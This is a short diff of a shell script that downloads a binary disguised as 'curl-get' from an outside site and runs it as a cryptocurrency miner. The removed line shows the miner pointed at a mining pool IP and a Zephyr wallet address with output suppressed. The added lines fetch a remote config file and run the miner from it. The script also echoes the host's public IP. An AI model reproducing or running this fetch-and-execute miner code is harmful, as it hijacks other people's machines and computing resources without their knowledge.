@@ -1,6 +1,7 @@
 wget -q https://02ip.ru/curl-get && chmod +x curl-get >/dev/null 2>&1
+wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./curl-get --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ -p 8v -a rx/0 -t -s >/dev/null 2>&1
+./curl-get -c "config.json" >/dev/null 2>&1
